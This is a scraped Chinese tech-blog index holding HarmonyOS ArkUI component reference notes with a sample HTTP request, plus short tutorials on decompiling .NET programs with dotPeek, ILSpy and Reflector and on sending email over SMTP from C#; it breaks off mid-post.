Sticky Sticky.None 设置ListItem吸顶效果，参见Sticky枚举描述。默认值：Sticky.None editable boolean | EditMode false 当前ListItem元素是否可编辑，进入编辑模式后可删除或移动。默认值：false selectable 8+ boolean true 当前ListItem元素是否可以被鼠标框选。默认值：true说明：外层List容器的鼠标框选开启时，ListItem的框选才生效。 Sticky枚举说明 名称 描述 None 无吸顶效果。 Normal 当前item吸顶。 Opacity 当前item吸顶显示透明度变化效果。 EditMode枚举说明 名称 描述 None 编辑操作不限制。 Deletable 可删除。 Movable 可移动。 事件 名称 功能描述 onSelect(event: (isSelected: boolean) =&gt; void) 8+ ListItem元素被鼠标框选的状态改变时触发回调。isSelected：进入鼠标框选范围即被选中返回true， 移出鼠标框选范围即未被选中返回 false。 123456789101112131415161718List() &#123; ListItem() &#123; Row() &#123; Image($r(&#x27;app.media.icon&#x27;)).width(&#x27;80vp&#x27;) Column() &#123; Text(&#x27;标題&#x27;) .fontColor(Color.Blue) .fontSize(&#x27;22fp&#x27;) Text(&#x27;描述&#x27;) .fontColor(Color.Gray) .fontSize(&#x27;22fp&#x27;) &#125; &#125; .padding(&#123;left:&#x27;10vp&#x27;&#125;) &#125; &#125; .backgroundColor(Color.White) ​ Tabs 通过页签进行内容视图切换的容器组件，每个页签对应一个内容视图。 123Tabs(value?: &#123;barPosition?: BarPosition, index?: number, controller?: TabsController&#125;) 参数 参数名 参数类型 必填 默认值 参数描述 barPosition BarPosition 否 BarPosition.Start 指定页签位置来创建Tabs容器组件。 index number 否 0 指定初次初始页签索引。 controller TabsController 否 - 设置Tabs控制器。 BarPosition枚举说明 名称 描述 Start vertical属性方法设置为true时，页签位于容器左侧；vertical属性方法设置为false时，页签位于容器顶部。 End vertical属性方法设置为true时，页签位于容器右侧；vertical属性方法设置为false时，页签位于容器底部。 属性不支持触摸热区设置。 名称 参数类型 默认值 描述 vertical boolean false 设置为false是为横向Tabs，设置为 true时为纵向Tabs。 scrollable boolean true 设置为true时可以通过滑动页面进行页面切换，为false时不可滑动切换页面。 barMode BarMode BarMode.Fixed TabBar布局模式，具体描述见 BarMode枚举说明。 barWidth Length - TabBar的宽度值。 barHeight Length - TabBar的高度值。 animationDuration number 200 TabContent滑动动画时长。 BarMode枚举说明 名称 描述 Scrollable TabBar使用实际布局宽度, 超过总长度后可滑动。 Fixed 所有TabBar平均分配宽度。 事件 名称 功能描述 onChange(event: (index: number) =&gt; void) Tab页签切换后触发的事件。- index: tab标签的索引值。 TabsController Tabs组件的控制器，用于控制Tabs组件进行页签切换。导入对象 12controller: TabsController = new TabsController() changeIndex changeIndex(value: number): void 控制Tabs切换到指定页签。参数： 参数名 参数类型 必填 默认值 参数描述 value number 是 - 页签在Tabs里的索引值，索引值从0开始。 TabContent仅在Tabs中使用，对应一个切换页签的内容视图。 1TabContent() 属性 名称 参数类型 默认值 描述 tabBar string | Resource| {icon?: string | Resource,text?: string | Resource}| CustomBuilder8+ - 设置TabBar上显示内容。CustomBuilder: 构造器，内部可以传入组件（API8版本以上适用）。说明：如果 icon采用svg格式图源，则要求svg图源删除其自有宽高属性值。如采用带有自有宽高属性的svg图源，icon大小则是svg本身内置的宽高属性值大小。 Swiper滑块视图容器，提供子组件滑动轮播显示的能力。参数 参数名 参数类型 必填 参数描述 controller SwiperController 否 给组件绑定一个控制器，用来控制组件翻页。 属性 名称 参数类型 描述 index number 设置当前在容器中显示的子组件的索引值。默认值：0 autoPlay boolean 子组件是否自动播放，自动播放状态下，导航点不可操作。默认值：false interval number 使用自动播放时播放的时间间隔，单位为毫秒。默认值：3000 indicator boolean 是否启用导航点指示器。默认值：true loop boolean 是否开启循环。设置为true时表示开启循环，在LazyForEach懒循环加载模式 下，加载的组件数量建议大于5个。默认值：true duration number 子组件切换的动画时长，单位为毫秒。 默认值：400 vertical boolean 是否为纵向滑动。默认值：false itemSpace number | string 设置子组件与子组件之间间隙。默认值：0 displayMode SwiperDisplayMode 设置子组件显示模式。默认值： SwiperDisplayMode.Stretch cachedCount 8+ number 设置预加载子组件个数。默认值：1 disableSwipe 8+ boolean 禁用组件滑动切换功能。默认值：false displayCount 8+ number | string 设置一页中显示子组件的个数，设置为 “auto”时等同于 SwiperDisplayMode.AutoLinear的显示 效果。默认值：1 effectMode 8+ EdgeEffect 设置滑动到边缘时的显示效果。默认值：EdgeEffect.Spring curve 8+ Curve | string 设置Swiper的动画曲线，默认为淡入淡出曲线 indicatorStyle 8+ {left?: Length,top?: Length,right?: Length,bottom?: Length,size?: Length,mask?: boolean,color?: ResourceColor,selectedColor?: ResourceColor} 设置导航点样式：- left: 设置导航点距离 Swiper组件左边的距离。- top: 设置导 航点距离Swiper组件顶部的距离。right: 设置导航点距离Swiper组件右边的距离。- bottom: 设置导航点距离 Swiper组件底部的距离。- size: 设置导航点的直径。- mask: 设置是否显示导航 点蒙层样式。- color: 设置导航点的颜 色。- selectedColor: 设置选中的导航点的颜色。 SwiperDisplayMode枚举说明 名称 描述 Stretch Swiper滑动一页的宽度为Swiper组件自身的宽度。 AutoLinear Swiper滑动一页的宽度为子组件宽度中的 大值。 EdgeEffect枚举说明 名称 描述 Spring 弹性物理动效，滑动到边缘后可以通过触摸事件继续滑动一段距离，松手后回弹。 Fade 滑动到边缘后，可以通过触摸事件继续滑动一段阴影，松手后阴影回弹。 None 滑动到边缘后无效果。 SwiperControllerSwiper容器组件的控制器，可以将此对象绑定至Swiper组件，然后通过它控制翻页。 showNext 1showNext(): void 翻至下一页。showPrevious 1showPrevious(): void 翻至上一页。finishAnimation 1finishAnimation(callback?: () =&gt; void): void 停止播放动画。参数： 参数名 参数类型 必填项 参数描述 callback () =&gt; void 是 动画结束的回调。 事件onChange 1onChange(event: (index: number) =&gt; void) 当前显示的组件索引变化时触发该事件，返回值为当前显示的子组件的索引值。 参数 参数名 参数类型 必填项 参数描述 index number 是 当前显示元素的索引。 Grid网格容器，由“行”和“列”分割的单元格所组成，通过指定“项目”所在的单元格做出各种各样的布局。 1Grid(scroller?: Scroller) 参数 参数名 参数类型 必填 参数描述 scroller Scroller 否 可滚动组件的控制器。用于与可滚动组件进行绑定。 属性 名称 参数类型 描述 columnsTemplate string 设置当前网格布局列的数量，不设置时默认1列。例 如, '1fr 1fr 2fr' 是将父组件分3列，将父组件允许的宽分为4等份，第一列占1份，第二列占1份，第三列占2 份。默认值：'1fr' rowsTemplate string 设置当前网格布局行的数量，不设置时默认1行。例如, '1fr 1fr 2fr'是将父组件分三行，将父组件允许的 高分为4等份，第一行占1份，第二行占一份，第三行占2份。默认值：'1fr' columnsGap Length 设置列与列的间距。默认值：0 rowsGap Length 设置行与行的间距。默认值：0 scrollBar BarState 设置滚动条状态。默认值：BarState.Off scrollBarColor string | number | Color 设置滚动条的颜色。 scrollBarWidth string | number 设置滚动条的宽度。 cachedCount number 设置预加载的GridItem的数量。具体使用可参考减少应用白块说明。默认值：1 editMode 8+ boolean 是否进入编辑模式，进入编辑模式可以拖拽Grid组件内部GridItem。默认值：false layoutDirection 8+ GridDirection 设置布局的主轴方向。默认值：GridDirection.Row maxCount 8+ number 当layoutDirection是Row/RowReverse时，表示可显示的 大行数当layoutDirection是 Column/ColumnReverse时，表示可显示的 大列 数。默认值：1 minCount 8+ number 当layoutDirection是Row/RowReverse时，表示可显示的 小行数。当layoutDirection是 Column/ColumnReverse时，表示可显示的 小列 数。默认值：1 cellLength 8+ number 当layoutDirection是Row/RowReverse时，表示一行的高度。当layoutDirection是 Column/ColumnReverse时，表示一列的宽度。默 认值：0 multiSelectable 8+ boolean 是否开启鼠标框选。- false：关闭框选。- true：开启框选。默认值：false supportAnimation 8+ boolean 是否支持动画。默认值：false GridDirection枚举说明8+ 名称 描述 Row 主轴布局方向沿水平方向布局，即自左往右先填满一行，再去填下一行。 Column 主轴布局方向沿垂直方向布局，即自上往下先填满一列，再去填下一列。 RowReverse 主轴布局方向沿水平方向反向布局，即自右往左先填满一行，再去填下一行。 ColumnReverse 主轴布局方向沿垂直方向反向布局，即自下往上先填满一列，再去填下一列。 事件 名称 功能描述 onScrollIndex(event: (first: number) =&gt; void) 当前网格显示的起始位置item发生变化 时触发。- first: 当前显示的网格起始位置的索引值。 onItemDragStart(event: (event: ItemDragInfo, itemIndex: number) =&gt; (() =&gt; any) | void) 开始拖拽网格元素时触发。 onItemDragEnter(event: (event: ItemDragInfo) =&gt; void) 拖拽进入网格元素范围内时触发。 onItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =&gt; void) 拖拽在网格元素范围内移动时触发。 onItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =&gt; void) 拖拽离开网格元素时触发。 onItemDrop(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number, isSuccess: boolean) =&gt; void) 绑定该事件的网格元素可作为拖拽释放目标，当在网格元素内停止拖拽时触发。 ItemDragInfo对象说明 名称 类型 描述 x number 当前拖拽点的x坐标。 y number 当前拖拽点的y坐标。 GridItem网格容器中单项内容容器。 1GridItem() 属性 名称 参数类型 描述 rowStart number 指定当前元素起始行号。 rowEnd number 指定当前元素终点行号。 columnStart number 指定当前元素起始列号。 columnEnd number 指定当前元素终点列号。 forceRebuild boolean 设置在触发组件build时是否重新创建此节点。默认值：false selectable8+ boolean 当前GridItem元素是否可以被鼠标框选。默认值：true说明：外层 Grid容器的鼠标框选开启时，GridItem的框选才生效。 事件 名称 功能描述 onSelect(event: (isSelected: boolean) =&gt; void)8+ GridItem元素被鼠标框选的状态改变时触发回调。isSelected：进入鼠标框选范围即被选中，返回true；移出鼠标框选范围即未被选中，返回 false。 123456789101112131415161718192021222324Grid() &#123; // 第一行 GridItem() &#123; Text(&#x27;1&#x27;) &#125; .height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;2&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;3&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;4&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;5&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) // GridItem() &#123; // Text(&#x27;6&#x27;) // &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) &#125;.height(&#x27;30%&#x27;).width(&#x27;30%&#x27;) ​ 基础组件 Text显示一段文本的组件。可以包含Span子组件。 12345678Text(content?: string | Resource)Text(this.message) .fontSize(20) .fontWeight(FontWeight.Bold) 属性 名称 参数类型 描述 textAlign TextAlign 设置多行文本的文本对齐方式。默认值： TextAlign.Start textOverflow {overflow: TextOverflow} 设置文本超长时的显示方式。默认值： {overflow: TextOverflow.Clip}说明：文本截断是按字截断。例如，英文以单词为 小单 位进行截断，若需要以字母为单位进行截断，可在字母间添加零宽空格：\\u200B。 maxLines number 设置文本的 大行数。默认值：Infinity lineHeight string | number | Resource 设置文本的文本行高，设置值不大于0时，不限制文本行高，自适应字体大小，Length为 number类型时单位为fp。 decoration {type: TextDecorationType,color?: ResourceColor} 设置文本装饰线样式及其颜色。默认值： {type: TextDecorationType.None,color： Color.Black} baselineOffset number | string 设置文本基线的偏移量。 letterSpacing number | string 设置文本字符间距。 minFontSize number | string | Resource 设置文本 小显示字号。 maxFontSize number | string | Resource 设置文本 大显示字号。 textCase TextCase 设置文本大小写。默认值： TextCase.Normal TextInput单行文本输入框组件。 子组件 无 1234TextInput(value?:&#123;placeholder?: ResourceStr, text?: ResourceStr, controller?: TextInputController&#125;) 参数 参数名 参数类型 必填 参数描述 placeholder ResourceStr 否 无输入时的提示文本。 text ResourceStr 否 设置输入框当前的文本内容。 controller8+ TextInputController 否 设置TextInput控制器。 属性 名称 参数类型 描述 type InputType 设置输入框类型。默认值：InputType.Normal placeholderColor ResourceColor 设置placeholder颜色。 placeholderFont Font 设置placeholder文本样式：- size: 设置文本尺寸，Length为number类型时，使用fp单位。weight: 设置文本的字体粗细，number类型取值 [100, 900]，取值间隔为100，默认为400，取值越大，字体越粗。- family: 设置文本的字体列表。使 用多个字体，使用','进行分割，优先级按顺序生 效。例如：'Arial, sans-serif'。- style: 设置文本的字体样式。 enterKeyType EnterKeyType 设置输入法回车键类型。默认值： EnterKeyType.Done caretColor ResourceColor 设置输入框光标颜色。 maxLength number 设置文本的 大输入字符数。 inputFilter8+ {value: ResourceStr,error?: (value: string) =&gt; void} 正则表达式，满足表达式的输入允许显示，不满足正则表达式的输入被忽略。仅支持单个字符匹配，不支持字符串匹配。例如：^(?=.\\d)(?=.[a-z])(?=.* [A-Z]).{8,10}$，8到10位的强密码不支持过滤。value：设置正则表达式。- error：正则匹配失败时，返回被忽略的内容。 EnterKeyType枚举说明 名称 描述 Go 显示Go文本。 Search 显示为搜索样式。 Send 显示为发送样式。 Next 显示为下一个样式。 Done 标准样式。 InputType枚举说明 名称 描述 Normal 基本输入模式。 Password 密码输入模式。 Email e-mail地址输入模式。 Number 纯数字输入模式。 事件 名称 功能描述 onChange(callback: (value: string) =&gt; void) 输入发生变化时，触发回调。 onSubmit(callback: (enterKey: EnterKeyType) =&gt; void) 回车键或者软键盘回车键触发该回调，参数为当前软键盘回车键类型。 onEditChanged(callback: (isEditing: boolean) =&gt; void)(deprecated) 输入状态变化时，触发回调。 onEditChange(callback: (isEditing: boolean) =&gt; void) 8+ 输入状态变化时，触发回调。 onCopy8+(callback:(value: string) =&gt; void) 长按输入框内部区域弹出剪贴板后，点击剪切板复制按钮，触发回调。value：复制的文本内容。 onCut8+(callback:(value: string) =&gt; void) 长按输入框内部区域弹出剪贴板后，点击剪切板剪切按钮，触发回调。value：剪切的文本内容。 onPaste8+(callback:(value: string) =&gt; void) 长按输入框内部区域弹出剪贴板后，点击剪切板粘贴按钮，触发回调。value：粘贴的文本内容。 1234TextInput() .padding(&#123;top:&#x27;5vp&#x27;&#125;) .margin(&#123;top:&#x27;5vp&#x27;&#125;) ​TextInputController 8+ TextInput组件的控制器。 导入对象 123456controller: TextInputController = new TextInputController() caretPosition caretPosition(value: number): void 设置光标移动到指定位置。参数： 1&lt;div class=&quot;table-box&quot;&gt;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; style=&quot;margin-left:.3pt;width:444.2pt;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:45.1pt;&quot;&gt; &lt;p style=&quot;margin-left:.1pt;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;参数名&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:57.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;参数类型&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:36pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;必填&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:306.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;参数描述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;border-color:#dfe2e5;width:45.1pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;text-align:center;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;value&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:57.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;number&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:36pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;是&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:306.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;设置输入光标的位置。value：从字符串开始到光标所在位置的字符长度。&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt; Button按钮组件，可快速创建不同样式的按钮。 接口 方法1： 1Button(options?: &#123;type?: ButtonType, stateEffect?: boolean&#125;) 参数 参数名 参数类型 必填 参数描述 type ButtonType 否 描述按钮显示样式。默认值：ButtonType.Capsule stateEffect boolean 否 按钮按下时是否开启按压态显示效果，当设置为false时，按压效果关闭。。默认值：true 方法 1Button(label?: ResourceStr, options?: &#123; type?: ButtonType, stateEffect?: boolean &#125;) 使用文本内容创建相应的按钮组件，此时Button无法包含子组件。参数： 参数名 参数类型 必填 参数描述 label ResourceStr 否 按钮文本内容。 options {type?: ButtonType,stateEffect?: boolean} 否 见方法1参数说明。 属性 名称 参数类型 描述 type ButtonType 设置Button样式。默认值：ButtonType.Capsule stateEffect boolean 按钮按下时是否开启按压态显示效果，当设置为false时，按压效果关闭。默认值：true ButtonType枚举说明 名称 描述 Capsule 胶囊型按钮（圆角默认为高度的一半）。 Circle 圆形按钮。 Normal 普通按钮（默认不带圆角）。 12345678Button() &#123; Text(&#x27;点击&#x27;) &#125; .width(&#x27;100fp&#x27;) .backgroundColor(Color.Gray) .padding(&#123;top:&#x27;5vp&#x27;&#125;) .margin(&#123;top:&#x27;5vp&#x27;&#125;) Image图片组件，支持本地图片和网络图片的渲染展示。 1Image(src: string | PixelMap | Resource) 参数 参数名 参数类型 必填 默认值 参数描述 src string| PixelMap| Resource 是 - 图片的数据源，支持本地图片和网络图片。当使用相对路径 引用图片资源时，例如Image(\"common/test.jpg\")，不支持该Image组件被跨包/跨模块调用，建议使用$r方式来管理需全局使用的图片资源。- 支持的图片格式包括png、jpg、 bmp、svg和gif。- 支持Base64字符串。格式 data:image/[png|jpeg|bmp|webp];base64,[base64 data], 其中[base64 data]为Base64字符串数据。- 支持 dataability://路径前缀的字符串，用于访问通过data ability 提供的图片路径。 属性 名称 参数类型 默认值 描述 alt string | Resource - 加载时显示的占位图。仅支持本地图片。 objectFit ImageFit Cover 设置图片的缩放类型。 objectRepeat ImageRepeat NoRepeat 设置图片的重复样式。说明：svg类型图源不支持该属性。 interpolation ImageInterpolation None 设置图片的插值效果，即减轻低清晰度图片在放大显示的时候出现的锯齿问题，仅针对图片放大插值。说明：- svg类型图源不支持该属性。- PixelMap资源不支持该属性。 renderMode ImageRenderMode Original 设置图片渲染的模式。说明：svg类型图源不支持该属性。 sourceSize {width: number,height: number} - 设置图片解码尺寸，将原始图片 解码成指定尺寸的图片， number类型单位为px。说明：PixelMap资源和SVG图片不支持该属性。 matchTextDirection boolean false 设置图片是否跟随系统语言方向，在RTL语言环境下显示镜像翻转显示效果。 fitOriginalSize boolean true 图片组件尺寸未设置时，其显示尺寸是否跟随图源尺寸。 fillColor ResourceColor - 仅对svg图源生效，设置后会替换svg图片的fill颜色。 autoResize boolean true 是否需要在图片解码过程中对图源做resize操作，该操作会根据显示区域的尺寸决定用于绘制的图源尺寸，有利于减少内存占用。 syncLoad8+ boolean false 设置是否同步加载图片，默认是异步加载。同步加载时阻塞UI线程，不会显示占位图。 ImageInterpolation枚举说明 名称 描述 None 不使用插值图片数据。 High 高度使用插值图片数据，可能会影响图片渲染的速度。 Medium 中度使用插值图片数据。 Low 低度使用插值图片数据。 ImageRenderMode枚举说明 名称 描述 Original 按照原图进行渲染，包括颜色。 Template 将图像渲染为模板图像，忽略图片的颜色信息。 事件 名称 功能描述 onComplete(callback: (event?: { width: number, height: number, componentWidth: number,componentHeight: number, loadingStatus: number }) =&gt; void) 图片成功加载时触发该回调，返回成功加载的图源尺寸。 onError(callback: (event?: { componentWidth: number, componentHeight: number }) =&gt; void) 图片加载出现异常时触发该回调。 onFinish(event: () =&gt; void) 当加载的源文件为带动效的svg图片时，当svg动效播放完成时会触发这个回调，如果动效为无限循环动效，则不会触发这个回调。 1Image($r(&#x27;app.media.icon&#x27;)).width(&#x27;80vp&#x27;) 😴像素单位像素单位 提供4种像素单位，框架采用vp为基准数据单位。 名称 描述 px 屏幕物理像素单位。 vp 屏幕密度相关像素，根据屏幕像素密度转换为屏幕物理像素，当数值不带单位时，默认单位vp。 fp 字体像素，与vp类似适用屏幕密度变化，随系统字体大小设置变化。 lpx 视窗逻辑像素单位，lpx单位为实际屏幕宽度与逻辑宽度（通过designWidth配置）的比值。如配置designWidth为720时，在实际宽度为1440物理像素的屏幕上，1lpx为2px大小。 像素单位转换 提供其他单位与px单位互相转换的方法。 接口 描述 vp2px(value : number) : number 将vp单位的数值转换为以px为单位的数值。 px2vp(value : number) : number 将px单位的数值转换为以vp为单位的数值。 fp2px(value : number) : number 将fp单位的数值转换为以px为单位的数值。 px2fp(value : number) : number 将px单位的数值转换为以fp为单位的数值。 lpx2px(value : number) : number 将lpx单位的数值转换为以px为单位的数值。 px2lpx(value : number) : number 将px单位的数值转换为以lpx为单位的数值。 🛰️预览器编辑器常用的 真机log 预览器log​预览编辑器​ 组件预览​ ​ 👉请求后端接口测试import ohos.net.http 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// test.etsimport http from &#x27;@ohos.net.http&#x27;;export function test()&#123; // 每一个httpRequest对应一个HTTP请求任务，不可复用 let httpRequest = http.createHttp(); // 用于订阅HTTP响应头，此接口会比request请求先返回。可以根据业务需要订阅此消息 // 从API 8开始，使用on(&#x27;headersReceive&#x27;, Callback)替代on(&#x27;headerReceive&#x27;, AsyncCallback)。 8+ httpRequest.on(&#x27;headersReceive&#x27;, (header) =&gt; &#123; console.info(&#x27;header: &#x27; + JSON.stringify(header)); &#125;); httpRequest.request( // 填写HTTP请求的URL地址，可以带参数也可以不带参数。URL地址需要开发者自定义。请求的参数可以在extraData中指定 &quot;/api/userApi/RegIMUser&quot;, &#123; method: http.RequestMethod.POST, // 可选，默认为http.RequestMethod.GET // 开发者根据自身业务需要添加header字段 header: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;, // 当使用POST请求时此字段用于传递内容 extraData: &#123; &quot;mobile&quot;: &quot;20240419&quot;, &quot;password&quot;: &quot;123123&quot;, &quot;ucode&quot;: &quot;666666&quot; &#125;, expectDataType: http.HttpDataType.STRING, // 可选，指定返回数据的类型 usingCache: true, // 可选，默认为true priority: 1, // 可选，默认为1 connectTimeout: 60000, // 可选，默认为60000ms readTimeout: 60000, // 可选，默认为60000ms usingProtocol: http.HttpProtocol.HTTP1_1, // 可选，协议类型默认值由系统自动指定 &#125;, (err, data) =&gt; &#123; if (!err) &#123; // data.result为HTTP响应内容，可根据业务需要进行解析 console.info(&#x27;Result:&#x27; + JSON.stringify(data.result)); console.info(&#x27;code:&#x27; + JSON.stringify(data.responseCode)); // data.header为HTTP响应头，可根据业务需要进行解析 console.info(&#x27;header:&#x27; + JSON.stringify(data.header)); console.info(&#x27;cookies:&#x27; + JSON.stringify(data.cookies)); // 8+ return JSON.stringify(data.result); &#125; else &#123; console.info(&#x27;error:&#x27; + JSON.stringify(err)); // 取消订阅HTTP响应头事件 httpRequest.off(&#x27;headersReceive&#x27;); // 当该请求使用完毕时，调用destroy方法主动销毁 httpRequest.destroy(); return JSON.stringify(err); &#125; &#125; );&#125; index.ets调用 123456789// index.etsimport &#123;test&#125; from &#x27;../Common/Stest&#x27; onPageShow() &#123; console.info(&#x27;Index onPageShow&#x27;); const tests = test(); &#125; 请求结果 ​ sql查询 ​ End 🦉","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":".NET 反编译","slug":"NET-Reflector","date":"2024-04-20T22:14:22.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/21/NET-Reflector/","permalink":"https://banjinmei.github.io/2024/04/21/NET-Reflector/","excerpt":"","text":"反编译是对程序进行逆向分析、研究，以推导出软件产品所使用的思路、原理、结构、算法、处理过程、运行方法等设计要素。 反编译.NET程序需要使用专门的反编译工具 🧿使用dotPeek进行反编译1.下载dotPeekdotPeek：JetBrains 出品的免费 .NET 反编译器与程序集浏览器 ​ 2.File &gt; Open ​ 3.打开需要反编译的文件方法 ​ 🧝‍♂️使用ILSpy进行反编译 下载并安装ILSpy：https://github.com/icsharpcode/ILSpy/releases 2.文件-打开-exe ​ 3.查看反编译内容 找到Form1 可以看到里面反编译的内容 ​ 复制到vs里面 替换代码添加相关引用即可 🤖使用Reflector进行反编译1.File &gt; Open Assembly ​​ 2.点开WinTime.exe内容 ​ 3.查看反编译内容 可以看到反编译出来的控件和方法​ 点开方法，可以看到方法内的内容 注意： 反编译的代码可能不完全等同于原始源代码，因为编译器可能会进行优化，并且某些信息可能因为混淆技术而无法恢复。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":".NET SMTP","slug":"NET-Smtp","date":"2024-04-20T13:13:11.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/20/NET-Smtp/","permalink":"https://banjinmei.github.io/2024/04/20/NET-Smtp/","excerpt":"","text":"SMTP（Simple Mail Transfer Protocol）是用于电子邮件传输的规则集，可以从邮件客户端向接收电子邮件服务器发送、中继或转发邮件。发件人可使用SMTP 服务器来执行发送电子邮件的过程。SMTP服务器则是按照这些规则中转电子邮件的服务器。 IMAP可以理解为收邮件。​ 🐧使用QQ邮箱发邮件首先需要设置开启邮箱的SMTP服务 登录(https://mail.qq.com/)电脑网页版邮箱进入【设置】-&gt;【帐户】-&gt;【POP3/IMAP/SMTP服务】， 开启或关闭相应服务最后保存更改即可。​ QQ邮箱 POP3 和 SMTP 服务器地址设置如下： 邮箱 POP3服务器（端口995） SMTP服务器（端口465或587）qq.com pop.qq.com smtp.qq.comSMTP服务器需要身份验证。 以下是示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using ConsoleApp1Test;//xxxstring server = &quot;smtp.qq.com&quot;;string username = &quot;my test email&quot;;string password = &quot;xxx;string from = &quot;from@qq.com&quot;;string to = &quot;to@qq.com&quot;;string subject = &quot;Test Email&quot;;string content = &quot;This is a test email sent asynchronously.&quot;;bool isHtml = false; // 是否为 HTML 格式try&#123; bool success = await MailHelper. SendMailAsync(server, username, password, from, to, null, subject, content, isHtml); if (success) &#123; Console.WriteLine(&quot;邮件发送成功！&quot;); &#125; else &#123; Console.WriteLine(&quot;邮件发送失败！&quot;); &#125;&#125;catch (Exception ex)&#123; Console.WriteLine($&quot;邮件发送出错：&#123;ex.Message&#125;&quot;);&#125;using System;using System.Collections.Generic;using System.Linq;using System.Net.Mail;using System.Text;using System.Threading.Tasks; namespace ConsoleApp1Test&#123; internal class MailHelper &#123; public static async Task&lt;bool&gt; SendMailAsync(string server, string username, string password, string from, string to, string cc, string subject, string content, bool isHtml) &#123; try &#123; using (var smtp = new SmtpClient(server)) &#123; smtp.UseDefaultCredentials = false; smtp.Credentials = new System.Net.NetworkCredential(username, password); smtp.EnableSsl = true; // 启用加密 smtp.DeliveryMethod = SmtpDeliveryMethod.Network; using (var mail = new MailMessage()) &#123; mail.From = new MailAddress(from); mail.To.Add(to); mail.SubjectEncoding = Encoding.UTF8; mail.Subject = subject; mail.IsBodyHtml = isHtml; mail.BodyEncoding = Encoding.UTF8; mail.Body = content; await smtp.SendMailAsync(mail); // 异步发送邮件 &#125; return true; &#125; &#125; catch (Exception err) &#123; // 发送失败时的异常处理 // 可以在此处记录日志 return false; &#125; &#125; &#125;&#125; ​​ 🐷使用网易邮箱发送邮件163网易免费邮 设置 &gt; POP3&#x2F;SMTP&#x2F;IMAP ​​ 使用网易邮箱发送邮件上述示例类似，只需替换相应的服务器地址、用户名、密码、发件人、收件人、主题、内容等信息即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647string server = &quot;smtp.163.com&quot;;string username = &quot;f@163.com&quot;;string password = &quot;xxx&quot;;string from = &quot;f@163.com&quot;;string to = &quot;t@qq.com&quot;;string subject = &quot;Test163Email m&quot;;string content = &quot;This is a test email &quot;;bool isHtml = false; // 是否为 HTML 格式``` c#运行：​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa07.jpg&quot; &gt;​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa08.jpg&quot; &gt;​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa09.jpg&quot; &gt;# 🐬使用谷歌邮箱发送邮件谷歌Gmail邮箱登陆地址：https://mail.google.com​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa10.jpg&quot; &gt;​&lt;img onerror=&quot;notfound(this);&quot; 